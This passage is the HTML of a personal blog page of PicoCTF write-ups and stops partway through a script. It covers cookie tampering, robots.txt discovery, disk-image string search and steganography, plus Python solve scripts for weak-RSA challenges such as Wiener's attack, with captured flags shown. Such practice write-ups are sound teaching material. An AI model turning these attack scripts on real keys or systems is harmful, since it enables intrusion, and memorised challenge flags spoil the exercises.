<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  PicoCTF - Easy Peasy Or Bad Questions
  #

[TOC]

  Challenge: logon🍰
  #


  Exploit - Set cookie
  #





  Challenge: where are the robots🍰
  #


  Exploit - robots.txt
  #

Payload: https://jupiter.challenges.picoctf.org/problem/56830/robots.txt

Payload: https://jupiter.challenges.picoctf.org/problem/56830/1bb4c.html



  Challenge: Packets Primer🍰
  #


  Exploit - search { string directly
  #




  Challenge: Disk, disk, sleuth!🍰
  #


  Exploit - Strings search
  #

$ file dds1-alpine.flag.img.gz
dds1-alpine.flag.img.gz: gzip compressed data, was "dds1-alpine.flag.img", last modified: Tue Mar 16 00:19:24 2021, from Unix, original size modulo 2^32 134217728
$ gzip -d dds1-alpine.flag.img.gz
$ ls
dds1-alpine.flag.img
$ strings dds1-alpine.flag.img | grep "pico"
ffffffff81399ccf t pirq_pico_get
ffffffff81399cee t pirq_pico_set
ffffffff820adb46 t pico_router_probe
  SAY picoCTF{f0r3ns1c4t0r_n30phyt3_564ff1a0}


  Challenge: Sleuthkit Apprentice🍰
  #


  Exploit - FTK Imager
  #

'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/practice/picoctf/bad-questions/picoctf---easy-peasy-or-bad-questions/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="PicoCTF - Easy Peasy Or Bad Questions"><meta property="og:description" content='PicoCTF - Easy Peasy Or Bad Questions # [TOC]
Challenge: logon🍰 # Exploit - Set cookie # Challenge: where are the robots🍰 # Exploit - robots.txt # Payload: https://jupiter.challenges.picoctf.org/problem/56830/robots.txt Payload: https://jupiter.challenges.picoctf.org/problem/56830/1bb4c.html Challenge: Packets Primer🍰 # Exploit - search { string directly # Challenge: Disk, disk, sleuth!🍰 # Exploit - Strings search # $ file dds1-alpine.flag.img.gz dds1-alpine.flag.img.gz: gzip compressed data, was "dds1-alpine.flag.img", last modified: Tue Mar 16 00:19:24 2021, from Unix, original size modulo 2^32 134217728 $ gzip -d dds1-alpine.flag.img.gz $ ls dds1-alpine.flag.img $ strings dds1-alpine.flag.img | grep "pico" ffffffff81399ccf t pirq_pico_get ffffffff81399cee t pirq_pico_set ffffffff820adb46 t pico_router_probe SAY picoCTF{f0r3ns1c4t0r_n30phyt3_564ff1a0} Challenge: Sleuthkit Apprentice🍰 # Exploit - FTK Imager #'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="PicoCTF"><meta property="article:tag" content="CTF"><title>PicoCTF - Easy Peasy Or Bad Questions | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/practice/picoctf/bad-questions/picoctf---easy-peasy-or-bad-questions/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>PicoCTF - Easy Peasy Or Bad Questions</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#challenge-logon>Challenge: <a href="https://play.picoctf.org/practice/challenge/46?category=1&amp;page=1">logon</a>🍰</a><ul><li><a href=#exploit---set-cookie>Exploit - Set cookie</a></li></ul></li><li><a href=#challenge-where-are-the-robots>Challenge: <a href="https://play.picoctf.org/practice/challenge/4?category=1&amp;page=1">where are the robots</a>🍰</a><ul><li><a href=#exploit---robotstxt>Exploit - robots.txt</a></li></ul></li><li><a href=#challenge-packets-primer>Challenge: <a href="https://play.picoctf.org/practice/challenge/286?category=4&amp;page=2">Packets Primer</a>🍰</a><ul><li><a href=#exploit---search--string-directly>Exploit - search <code>{</code> string directly</a></li></ul></li><li><a href=#challenge-disk-disk-sleuth>Challenge: <a href=https://mercury.picoctf.net/static/920731987787c93839776ce457d5ecd6/dds1-alpine.flag.img.gz>Disk, disk, sleuth!</a>🍰</a><ul><li><a href=#exploit---strings-search>Exploit - Strings search</a></li></ul></li><li><a href=#challenge-sleuthkit-apprentice>Challenge: <a href="https://play.picoctf.org/practice/challenge/300?category=4&amp;page=3">Sleuthkit Apprentice</a>🍰</a><ul><li><a href=#exploit---ftk-imager>Exploit - FTK Imager</a></li></ul></li><li><a href=#challenge-st3g0>Challenge: <a href="https://play.picoctf.org/practice/challenge/305?category=4&amp;page=4">St3g0</a>🍰</a><ul><li><a href=#exploit---zsteg>Exploit - <code>zsteg</code></a></li></ul></li><li><a href=#challenge-the-numbers>Challenge: <a href="https://play.picoctf.org/practice?category=2&amp;page=1">The Numbers</a>🍰</a><ul><li><a href=#exploit---alphabetic-sequence>Exploit - Alphabetic Sequence</a></li></ul></li><li><a href=#challenge-b00tl3grsa2>Challenge: b00tl3gRSA2🍰</a><ul><li><a href=#exploit---large-e-in-rsa>Exploit - Large <code>e</code> in RSA</a></li></ul></li><li><a href=#challenge-sum-o-primes>Challenge: Sum-O-Primes🍰</a><ul><li><a href=#source-code>Source Code</a></li><li><a href=#exploit---easy>Exploit - Easy</a></li></ul></li><li><a href=#challenge-b00tl3grsa3>Challenge: b00tl3gRSA3🍰</a><ul><li><a href=#recon>Recon</a></li><li><a href=#exploit---smooth-value>Exploit - Smooth Value</a></li></ul></li><li><a href=#challenge-soap>Challenge: SOAP🍰</a><ul><li><a href=#exploit---the-simplest-xxe>Exploit - The simplest XXE</a></li></ul></li><li><a href=#challenge-picobrowser>Challenge: picobrowser🍰</a><ul><li><a href=#exploit>Exploit</a></li></ul></li><li><a href=#challenge-client-side-again>Challenge: Client-side-again🍰</a><ul><li><a href=#exploit---reverse-script>Exploit - Reverse Script</a></li></ul></li><li><a href=#challenge-forbidden-paths>Challenge: Forbidden Paths🍰</a><ul><li><a href=#exploit---easy-lfi>Exploit - Easy LFI</a></li></ul></li><li><a href=#challenge-keygenme>Challenge: keygenme🍰</a><ul><li><a href=#source>Source</a></li><li><a href=#exploit-1>Exploit</a></li></ul></li><li><a href=#challenge-basic-file-exploit-1>Challenge: basic-file-exploit:-1:</a><ul><li><a href=#background>Background</a></li><li><a href=#source-code-1>Source Code</a></li><li><a href=#recon-1>Recon</a></li><li><a href=#exploit---reverse-carefully>Exploit - Reverse Carefully</a></li></ul></li><li><a href=#challenge-buffer-overflow-0>Challenge: buffer overflow 0🍰</a><ul><li><a href=#source-code-2>Source Code</a></li><li><a href=#recon-2>Recon</a></li><li><a href=#exploit---simple-bof>Exploit - Simple BoF</a></li></ul></li><li><a href=#challenge-clutter-overflow>Challenge: clutter-overflow🍰</a><ul><li><a href=#recon-3>Recon</a></li><li><a href=#exploit-2>Exploit</a></li></ul></li><li><a href=#challenge-wine-1>Challenge: wine:-1:</a><ul><li><a href=#recon-4>Recon</a></li><li><a href=#exploit-3>Exploit</a></li></ul></li><li><a href=#challenge-local-target>Challenge: Local Target🍰</a><ul><li><a href=#recon-5>Recon</a></li><li><a href=#exploit---array-bound>Exploit - Array Bound</a></li></ul></li><li><a href=#challenge-picker-iv>Challenge: Picker IV🍰</a><ul><li><a href=#recon-6>Recon</a></li><li><a href=#exploit---ret2funcntion>Exploit - Ret2Funcntion</a></li></ul></li><li><a href=#challenge-hurry-up-wait>Challenge: Hurry up! Wait!🍰</a><ul><li><a href=#recon--prepare>Recon & Prepare</a></li><li><a href=#exploit-4>Exploit</a></li></ul></li><li><a href=#challenge-droid0-1>Challenge: droid0:-1:</a><ul><li><a href=#recon--prepare-1>Recon & Prepare</a></li><li><a href=#exploit-5>Exploit</a></li></ul></li><li><a href=#challenge-webnet1>Challenge: WebNet1🍰</a><ul><li><a href=#exploit---import-tls-key--string-seach>Exploit - Import TLS Key / String Seach</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=picoctf---easy-peasy-or-bad-questions>PicoCTF - Easy Peasy Or Bad Questions
<a class=anchor href=#picoctf---easy-peasy-or-bad-questions>#</a></h1><p>[TOC]</p><h2 id=challenge-logon>Challenge: <a href="https://play.picoctf.org/practice/challenge/46?category=1&amp;page=1">logon</a>🍰
<a class=anchor href=#challenge-logon>#</a></h2><h3 id=exploit---set-cookie>Exploit - Set cookie
<a class=anchor href=#exploit---set-cookie>#</a></h3><p><img src=https://i.imgur.com/lZ4wQUW.png alt>
<img src=https://i.imgur.com/OUTQtCP.png alt></p><hr><h2 id=challenge-where-are-the-robots>Challenge: <a href="https://play.picoctf.org/practice/challenge/4?category=1&amp;page=1">where are the robots</a>🍰
<a class=anchor href=#challenge-where-are-the-robots>#</a></h2><h3 id=exploit---robotstxt>Exploit - robots.txt
<a class=anchor href=#exploit---robotstxt>#</a></h3><p>Payload: <code>https://jupiter.challenges.picoctf.org/problem/56830/robots.txt</code>
<img src=https://i.imgur.com/LjqyriL.png alt>
Payload: <code>https://jupiter.challenges.picoctf.org/problem/56830/1bb4c.html</code>
<img src=https://i.imgur.com/NBKgAAg.png alt></p><hr><h2 id=challenge-packets-primer>Challenge: <a href="https://play.picoctf.org/practice/challenge/286?category=4&amp;page=2">Packets Primer</a>🍰
<a class=anchor href=#challenge-packets-primer>#</a></h2><h3 id=exploit---search--string-directly>Exploit - search <code>{</code> string directly
<a class=anchor href=#exploit---search--string-directly>#</a></h3><p><img src=https://i.imgur.com/Qf0YaZz.png alt></p><hr><h2 id=challenge-disk-disk-sleuth>Challenge: <a href=https://mercury.picoctf.net/static/920731987787c93839776ce457d5ecd6/dds1-alpine.flag.img.gz>Disk, disk, sleuth!</a>🍰
<a class=anchor href=#challenge-disk-disk-sleuth>#</a></h2><h3 id=exploit---strings-search>Exploit - Strings search
<a class=anchor href=#exploit---strings-search>#</a></h3><pre tabindex=0><code class=language-bash! data-lang=bash!>$ file dds1-alpine.flag.img.gz
dds1-alpine.flag.img.gz: gzip compressed data, was &#34;dds1-alpine.flag.img&#34;, last modified: Tue Mar 16 00:19:24 2021, from Unix, original size modulo 2^32 134217728
$ gzip -d dds1-alpine.flag.img.gz
$ ls
dds1-alpine.flag.img
$ strings dds1-alpine.flag.img | grep &#34;pico&#34;
ffffffff81399ccf t pirq_pico_get
ffffffff81399cee t pirq_pico_set
ffffffff820adb46 t pico_router_probe
  SAY picoCTF{f0r3ns1c4t0r_n30phyt3_564ff1a0}
</code></pre><hr><h2 id=challenge-sleuthkit-apprentice>Challenge: <a href="https://play.picoctf.org/practice/challenge/300?category=4&amp;page=3">Sleuthkit Apprentice</a>🍰
<a class=anchor href=#challenge-sleuthkit-apprentice>#</a></h2><h3 id=exploit---ftk-imager>Exploit - FTK Imager
<a class=anchor href=#exploit---ftk-imager>#</a></h3><p><img src=https://i.imgur.com/4iZjRu6.png alt></p><hr><h2 id=challenge-st3g0>Challenge: <a href="https://play.picoctf.org/practice/challenge/305?category=4&amp;page=4">St3g0</a>🍰
<a class=anchor href=#challenge-st3g0>#</a></h2><h3 id=exploit---zsteg>Exploit - <code>zsteg</code>
<a class=anchor href=#exploit---zsteg>#</a></h3><p><img src=https://i.imgur.com/kb2e72I.png alt></p><hr><h2 id=challenge-the-numbers>Challenge: <a href="https://play.picoctf.org/practice?category=2&amp;page=1">The Numbers</a>🍰
<a class=anchor href=#challenge-the-numbers>#</a></h2><h3 id=exploit---alphabetic-sequence>Exploit - Alphabetic Sequence
<a class=anchor href=#exploit---alphabetic-sequence>#</a></h3><p>A $\to$ 1
B $\to$ 2
&mldr;
Z $\to$ 26
Flag: <code>PICOCTF{THENUMBERSMASNO}</code></p><hr><h2 id=challenge-b00tl3grsa2>Challenge: b00tl3gRSA2🍰
<a class=anchor href=#challenge-b00tl3grsa2>#</a></h2><p>Very similar to <a href=https://hackmd.io/@SBK6401/Bk7LEmGwn>Dachshund Attacks</a></p><p><a href=https://zhuanlan.zhihu.com/p/76228394>(5)低解密指數攻擊</a></p><h3 id=exploit---large-e-in-rsa>Exploit - Large <code>e</code> in RSA
<a class=anchor href=#exploit---large-e-in-rsa>#</a></h3><p>:::spoiler Exploit Script</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> gmpy2
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.PublicKey <span style=color:#f92672>import</span> RSA
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> ContinuedFractions<span style=color:#f92672>,</span> Arithmetic
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> long_to_bytes 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>wiener_hack</span>(e, n):
</span></span><span style=display:flex><span>    <span style=color:#75715e># firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git !</span>
</span></span><span style=display:flex><span>    frac <span style=color:#f92672>=</span> ContinuedFractions<span style=color:#f92672>.</span>rational_to_contfrac(e, n)
</span></span><span style=display:flex><span>    convergents <span style=color:#f92672>=</span> ContinuedFractions<span style=color:#f92672>.</span>convergents_from_contfrac(frac)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (k, d) <span style=color:#f92672>in</span> convergents:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> k <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>and</span> (e <span style=color:#f92672>*</span> d <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>%</span> k <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>            phi <span style=color:#f92672>=</span> (e <span style=color:#f92672>*</span> d <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>//</span> k
</span></span><span style=display:flex><span>            s <span style=color:#f92672>=</span> n <span style=color:#f92672>-</span> phi <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>            discr <span style=color:#f92672>=</span> s <span style=color:#f92672>*</span> s <span style=color:#f92672>-</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>*</span> n
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (discr <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>0</span>):
</span></span><span style=display:flex><span>                t <span style=color:#f92672>=</span> Arithmetic<span style=color:#f92672>.</span>is_perfect_square(discr)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> t <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>and</span> (s <span style=color:#f92672>+</span> t) <span style=color:#f92672>%</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>                    print(<span style=color:#e6db74>&#34;Hacked!&#34;</span>)
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span> d
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
</span></span><span style=display:flex><span>    <span style=color:#75715e># n = 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597L</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># e = 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619L</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># c = 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</span>
</span></span><span style=display:flex><span>    c <span style=color:#f92672>=</span> <span style=color:#ae81ff>56811169374970604258879254822752913202698796852666466049062507281296833525794733933911606542222058381462570064389043798511821976201439555996087100908424109130076018300965272821022540600753461592318517243041444023628038886623171367273746266838142957409528381844138653228764240191549418194103631719400458457467</span>
</span></span><span style=display:flex><span>    n <span style=color:#f92672>=</span> <span style=color:#ae81ff>58070026135855523239461918454846975979926839142742523564643445392568377118997543017140325578838063916989981257526294599185581601337665038563515627572917307698324180632146478826058737890134680323581229835600225464118844212164933670376706076943294749341174871787564338433388944984493037567781794408220522036263</span>
</span></span><span style=display:flex><span>    e <span style=color:#f92672>=</span> <span style=color:#ae81ff>36130176628708131522838994566654566009391592426941561879120208879371471770209863345391365424152782310438126184550592620601969503885509400986708473532710919272338089391139828798480407038661283690225490135620650318136420441354969537269806129891673717369657476436221539029150435924295108842265903755215180202497</span>
</span></span><span style=display:flex><span>    d <span style=color:#f92672>=</span> wiener_hack(e, n)
</span></span><span style=display:flex><span>    m <span style=color:#f92672>=</span> pow(c, d, n)
</span></span><span style=display:flex><span>    print(long_to_bytes(m))
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__<span style=color:#f92672>==</span><span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    main()
</span></span></code></pre></div><p>:::</p><hr><h2 id=challenge-sum-o-primes>Challenge: Sum-O-Primes🍰
<a class=anchor href=#challenge-sum-o-primes>#</a></h2><h3 id=source-code>Source Code
<a class=anchor href=#source-code>#</a></h3><p>:::spoiler Source Code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/python</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> binascii <span style=color:#f92672>import</span> hexlify
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> gmpy2 <span style=color:#f92672>import</span> mpz_urandomb, next_prime, random_state
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> math
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> sys<span style=color:#f92672>.</span>version_info <span style=color:#f92672>&lt;</span> (<span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>9</span>):
</span></span><span style=display:flex><span>    <span style=color:#f92672>import</span> gmpy2
</span></span><span style=display:flex><span>    math<span style=color:#f92672>.</span>gcd <span style=color:#f92672>=</span> gmpy2<span style=color:#f92672>.</span>gcd
</span></span><span style=display:flex><span>    math<span style=color:#f92672>.</span>lcm <span style=color:#f92672>=</span> gmpy2<span style=color:#f92672>.</span>lcm
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>FLAG  <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#39;flag.txt&#39;</span>)<span style=color:#f92672>.</span>read()<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>FLAG  <span style=color:#f92672>=</span> int(hexlify(FLAG<span style=color:#f92672>.</span>encode()), <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>SEED  <span style=color:#f92672>=</span> int(hexlify(os<span style=color:#f92672>.</span>urandom(<span style=color:#ae81ff>32</span>))<span style=color:#f92672>.</span>decode(), <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>STATE <span style=color:#f92672>=</span> random_state(SEED)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_prime</span>(bits):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> next_prime(mpz_urandomb(STATE, bits) <span style=color:#f92672>|</span> (<span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;&lt;</span> (bits <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> get_prime(<span style=color:#ae81ff>1024</span>)
</span></span><span style=display:flex><span>q <span style=color:#f92672>=</span> get_prime(<span style=color:#ae81ff>1024</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>x <span style=color:#f92672>=</span> p <span style=color:#f92672>+</span> q
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> p <span style=color:#f92672>*</span> q
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>m <span style=color:#f92672>=</span> math<span style=color:#f92672>.</span>lcm(p <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>, q <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>d <span style=color:#f92672>=</span> pow(e, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, m)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> pow(FLAG, e, n)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;x = </span><span style=color:#e6db74>{</span>x<span style=color:#e6db74>:</span><span style=color:#e6db74>x</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;n = </span><span style=color:#e6db74>{</span>n<span style=color:#e6db74>:</span><span style=color:#e6db74>x</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;c = </span><span style=color:#e6db74>{</span>c<span style=color:#e6db74>:</span><span style=color:#e6db74>x</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span></code></pre></div><p>:::</p><h3 id=exploit---easy>Exploit - Easy
<a class=anchor href=#exploit---easy>#</a></h3><p>題目給了$x=p+q$，而我們的目標是求出$(p-1)*(q-1)=pq-p-q+1=n-x+1$
:::spoiler Exploit Script</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> inverse, long_to_bytes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>x <span style=color:#f92672>=</span> int(<span style=color:#e6db74>&#34;152a1447b61d023bebab7b1f8bc9d934c2d4b0c8ef7e211dbbcf841136d030e3c829f222cec318f6f624eb529b54bcda848f65574896d70cd6c3460d0c9064cd66e826578c2035ab63da67d069fa302227a9012422d2402f8f0d4495ef66104ebd774f341aa62f493184301debf910ab3d1e72e357a99c460370254f3dfccd9ae&#34;</span>, <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> int(<span style=color:#e6db74>&#34;6fc1b2be753e8f480c8b7576f77d3063906a6a024fe954d7fd01545e8f5b6becc24d70e9a5bc034a4c00e61f8a6176feb7d35fe39c8c03617ea4552840d93aa09469716913b58df677c785cd7633d1b7d31e2222cab53be235aa412ac5c5b07b500cf3fd5d6b91e2ddc51bff1e6eec2cb68723af668df36e10e332a9cbb7f3e2df9593fa0e553ed58afec2aa3bc4ae8ef1140e4779f61bdeae4c0b46136294cf151622e83c3d71b97c815b542208baa28207225f134c5a4feac998aeb178a5552f08643717819c10e8b5ec7715696c3bf4434fbea8e8a516dfd90046a999e24a0fb10d27291eb29ef3f285149c20189e7d0190417991094948180196543b8c91&#34;</span>, <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> int(<span style=color:#e6db74>&#34;16acf84a73cefd321ed491a15c640a495b09050cdce435ec37442faf9a694775e1ebffb6dbad6133cbc54e3f641506b0613f711625594fcb467f915f2708714b4c9936f5f4752c3299157cff4eb68eb82c0054dae351314829974f4feadaf126cda92b97e348dbef2640ec3a729a064e615df73d644700f93bf87579683e253d29622525bea3644f59aac8e0b2553bfea48d99e9b323e03cbf55166659974eb8c51cc7b2c2c5d6aa6c01b056a8ed7283d96656a3496f266726605af1be139d586f208d4d7c59c2771dc8036d490d3672ee4513301002775d7c39eac421c6cb4f01344e061549a4cb11c057accef1726572e447501004c772ec91b4a55811280f&#34;</span>, <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
</span></span><span style=display:flex><span>phi <span style=color:#f92672>=</span> n <span style=color:#f92672>-</span> x <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>d <span style=color:#f92672>=</span> inverse(e, phi)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(long_to_bytes(pow(c, d, n)))
</span></span></code></pre></div><p>:::</p><hr><h2 id=challenge-b00tl3grsa3>Challenge: b00tl3gRSA3🍰
<a class=anchor href=#challenge-b00tl3grsa3>#</a></h2><h3 id=recon>Recon
<a class=anchor href=#recon>#</a></h3><ul><li>Description: Why use p and q when I can use more?</li><li>Hint: There&rsquo;s more prime factors than p and q, finding d is going to be different.
和<a href=https://hackmd.io/@SBK6401/HyTTXZnPh>這題</a>幾乎一樣</li></ul><h3 id=exploit---smooth-value>Exploit - Smooth Value
<a class=anchor href=#exploit---smooth-value>#</a></h3><ol><li>先用<a href=https://www.alpertron.com/ECM.HTM>online tool</a><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>n <span style=color:#f92672>=</span> 9391862407×9430502773×10075292329×11026721677×11040417907×11226344687×11251922861×11323087873×11823788947×11956868381×11988198241×12275776127×12481146047×12665684987×12913613113×13994049331×14050490287×14654363873×15023405711×15220261411×15307561417×15368817697×15407160677×15542678147×15597563977×15670906213×15937323977×16033412617×16069849819×16364771063×16708525877×16824901871×16945613717×16989252559
</span></span></code></pre></div></li><li>寫Script<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> bytes_to_long, long_to_bytes, inverse
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p_q_factor <span style=color:#f92672>=</span> [<span style=color:#ae81ff>9391862407</span>,<span style=color:#ae81ff>9430502773</span>,<span style=color:#ae81ff>10075292329</span>,<span style=color:#ae81ff>11026721677</span>,<span style=color:#ae81ff>11040417907</span>,<span style=color:#ae81ff>11226344687</span>,<span style=color:#ae81ff>11251922861</span>,<span style=color:#ae81ff>11323087873</span>,<span style=color:#ae81ff>11823788947</span>,<span style=color:#ae81ff>11956868381</span>,<span style=color:#ae81ff>11988198241</span>,<span style=color:#ae81ff>12275776127</span>,<span style=color:#ae81ff>12481146047</span>,<span style=color:#ae81ff>12665684987</span>,<span style=color:#ae81ff>12913613113</span>,<span style=color:#ae81ff>13994049331</span>,<span style=color:#ae81ff>14050490287</span>,<span style=color:#ae81ff>14654363873</span>,<span style=color:#ae81ff>15023405711</span>,<span style=color:#ae81ff>15220261411</span>,<span style=color:#ae81ff>15307561417</span>,<span style=color:#ae81ff>15368817697</span>,<span style=color:#ae81ff>15407160677</span>,<span style=color:#ae81ff>15542678147</span>,<span style=color:#ae81ff>15597563977</span>,<span style=color:#ae81ff>15670906213</span>,<span style=color:#ae81ff>15937323977</span>,<span style=color:#ae81ff>16033412617</span>,<span style=color:#ae81ff>16069849819</span>,<span style=color:#ae81ff>16364771063</span>,<span style=color:#ae81ff>16708525877</span>,<span style=color:#ae81ff>16824901871</span>,<span style=color:#ae81ff>16945613717</span>,<span style=color:#ae81ff>16989252559</span>]
